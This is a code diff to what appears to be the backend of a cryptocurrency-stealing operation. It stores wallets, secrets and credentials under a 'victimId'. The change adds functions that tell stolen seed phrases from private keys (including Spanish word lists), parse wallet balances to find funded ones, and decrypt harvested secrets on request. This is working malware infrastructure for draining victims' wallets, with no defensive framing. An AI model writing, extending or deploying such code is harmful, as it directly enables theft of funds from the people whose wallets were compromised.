@@ -84,6 +84,39 @@ export function normalizeSecretKind(kind: string): string {
   return value || 'other';
 }
 
+const MNEMONIC_COUNTS = new Set([12, 15, 18, 21, 24]);
+
+/**
+ * Canonical kind from label **and** material. A 64-hex string is a private
+ * key even when the scanner found it inside `accounts.json`; a nine-word
+ * phrase is a seed even when the caller said `hex`. Spanish BIP-39 lists are
+ * not in the agent dictionary, so matching by shape is safer than by label.
+ */
+export function secretKindFor(kind: string, value: string, words?: number | null): string {
+  const normalized = normalizeSecretKind(kind);
+  if (words != null && MNEMONIC_COUNTS.has(Number(words))) return 'seed';
+  if (normalized === 'seed' || normalized === 'mnemonic') return 'seed';
+  const tokens = value.trim().split(/\s+/).filter(Boolean);
+  if (tokens.length >= 12 && tokens.every((token) => /^[a-záéíóúüñ]+$/i.test(token))) return 'seed';
+  return normalized;
+}
+
+/** `"1.204 ETH"`, `"0,5 ETH"`, `"<0.0001 BTC"` -> number. */
+export function balanceNumber(value: string | null | undefined): number {
+  if (!value) return 0;
+  const match = String(value).replace(/\s+/g, ' ').match(/([\d.,]+)/);
+  if (!match) return 0;
+  let raw = match[1]!;
+  if (raw.includes('.') && raw.includes(',')) raw = raw.replace(/,/g, '');
+  else if (raw.includes(',')) raw = raw.replace(',', '.');
+  const parsed = Number(raw);
+  return Number.isFinite(parsed) ? parsed : 0;
+}
+
+export function hasBalance(value: string | null | undefined): boolean {
+  return balanceNumber(value) > 0;
+}
+
 const isNonEmpty = (value: unknown): value is string => typeof value === 'string' && value.trim().length > 0;
 
 export async function upsertWallets(victimId: string, input: WalletInput[], db: Db = prisma) {
@@ -172,7 +205,7 @@ export async function upsertSecrets(victimId: string, secrets: SecretInput[], db
         walletId = (await syntheticWallet(victimId, `memory/${normalizeSecretKind(item.kind)}`, item.artifactId, db)).id;
       }
     }
-    const kind = normalizeSecretKind(item.kind);
+    const kind = secretKindFor(item.kind, item.value, item.words);
     const valueHash = createHash('sha256').update(item.value).digest('hex');
     const secret = await db.walletSecret.upsert({
       where: { walletId_kind_valueHash: { walletId, kind, valueHash } },
@@ -240,13 +273,23 @@ export async function upsertCredentials(
   return stored;
 }
 
-export async function revealSecret(walletId: string, kind?: string) {
-  const secret = await prisma.walletSecret.findFirst({
-    where: { walletId, ...(kind ? { kind } : {}) },
-    orderBy: [{ confidence: 'desc' }, { updatedAt: 'desc' }]
+export async function revealSecret(walletId: string, kind?: string, secretId?: string) {
+  const secrets = await prisma.walletSecret.findMany({
+    where: { walletId, ...(secretId ? { id: secretId } : {}) },
+    orderBy: [{ confidence: 'desc' }, { updatedAt: 'desc' }],
+    take: 50
   });
-  if (!secret) return null;
-  return { ...secret, value: openSecret(secret.valueEnc) };
+  for (const secret of secrets) {
+    let value: string;
+    try {
+      value = openSecret(secret.valueEnc);
+    } catch {
+      continue;
+    }
+    if (kind && secretKindFor(secret.kind, value, secret.words) !== kind) continue;
+    return { ...secret, value };
+  }
+  return null;
 }
 
 export function secretHash(value: string): string {
